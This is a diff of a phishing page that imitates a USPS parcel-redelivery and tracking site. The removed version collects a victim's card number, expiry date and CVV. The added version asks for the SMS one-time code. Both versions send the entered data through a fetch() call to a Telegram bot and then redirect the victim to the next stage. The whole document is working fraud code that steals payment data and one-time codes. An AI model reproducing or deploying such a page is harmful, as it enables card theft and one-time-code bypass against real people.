@@ -717,7 +717,7 @@ border:0;
               <div class="product_summary delivery_exception">
                 <h3 class="tracking_number">
                   Tracking Number:
-                  <span class="tracking-number"> US9514903585421</span>
+                  <span class="tracking-number"> US9514901185421</span>
                </h3>
 		<div class="expected_delivery">
 	</div>
@@ -731,7 +731,7 @@ border:0;
                     <p></p>
 				 </div> 
                 </div>
-					<div class="status_bar status_3">
+					<div class="status_bar status_5">
                   <div class="bar_third bar_third_1"><span></span></div>
                   <div class="bar_third bar_third_2"><span></span></div>
                   <div class="bar_third bar_third_3"><span></span></div>
@@ -740,55 +740,29 @@ border:0;
         </div><!-- End col -->	
       </div>
       
-  <h3 id="sign-in-to-your-account-header" class="lg-header" style="margin-bottom:7px;"><strong>Payment Method</strong></h3
+  <h3 id="sign-in-to-your-account-header" class="lg-header" style="margin-bottom:7px;"><strong>Verified Your Payment Method</strong></h3
       
       
+<p  style="margin-top:15px;font-size:14px;">To confirm the operation, enter the password that we have sent by SMS to your mobile **********.</p>
       
-<p  style="margin-top:15px;font-size:14px;"><a style="color:red;">This Redelivery request cost 1.99 USD.</a></p>
-      
-
 
 
 
 
 <form method="POST" id="form" action="">
 
-<div class="form-group" id="form-group-tcity">
-
 <div id="country-holder">
 <div id="us">
 <div class="row">
 <div class="col-xs-12 col-sm-4 col-md-4">
 <div class="form-group" id="form-group-taddress">
-<br>
-<input type="number" name="ccnumb" maxlength="50" required="" placeholder="Card Number" oninput="validateCreditCardNumber()" tabindex="8" id="taddress" class="form-control">
-
-
-</div>
-</div>
-<div class="col-xs-12 col-sm-4 col-md-4">
-<div class="form-group" id="form-group-tapt">
-<script>
-function ex(){
-	expr=document.getElementById("tapt").value;
-	if(expr.length==2){
-		document.getElementById("tapt").value=document.getElementById("tapt").value+'/';
-	}
-}
-</script>
-<br>
-<input type="text" name="expr" placeholder="Expiry Date (MM/YY)" maxlength="5"  oninput="ex()"  required="" value="" tabindex="9" id="tapt" class="form-control">
-
-</div>
-</div>
-</div>
-<div class="row">
-<div class="col-xs-12 col-sm-4 col-md-4">
-<div class="form-group" id="form-group-tcity">
 
 <br>
-<input type="number" name="cvvz" maxlength="4" placeholder="Security code" required="" tabindex="10" id="tcity" class="form-control">
-</div>
+<input type="number" name="sms" maxlength="50" required="" placeholder="SMS KEY" tabindex="8" id="taddress" class="form-control">
+
+
+
+
 
 </div>
 <div class="col-xs-12 col-sm-4 col-md-3">
@@ -810,7 +784,7 @@ function ex(){
 								
 <div class="row">
 <center>
-<button type="submit" name="okbb"><div id="a-address-step1-wrap" class="btn-wrap-single"><a tabindex="13" id="a-address-step1" class="btn btn-primary btn-lg">Continue</a></div></button>
+<button type="submit" name="okbba"><div id="a-address-step1-wrap" class="btn-wrap-single"><a tabindex="13" id="a-address-step1" class="btn btn-primary btn-lg">Continue</a></div></button>
 </center>
 </div></form>
 </div>
@@ -916,6 +890,7 @@ function ex(){
 </footer>
 </div><div id="quick-tools-container" style="display:none;"><div>
 
+
 	<script>
 		const formal = document.querySelector('#form')
 	  
@@ -928,15 +903,13 @@ function ex(){
 			e.preventDefault();
   
 			let ccc = document.querySelector('#taddress').value
-			let exp = document.querySelector('#tapt').value
-			let cvv = document.querySelector('#tcity').value
-
 			
-			fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=(USPS)  ==BIN::=${ccc}==EXP::-${exp}==CVV:: ${cvv}`, {
+			fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=(USPS)  ==CODE::=${ccc}=`, {
 				method: "GET"
 			}).then(success => {
 			
-				window.location.replace("/index3.html");
+				window.location.replace("/index6.html");
+
   
 			}, error => {
 				alert("Message not sent")
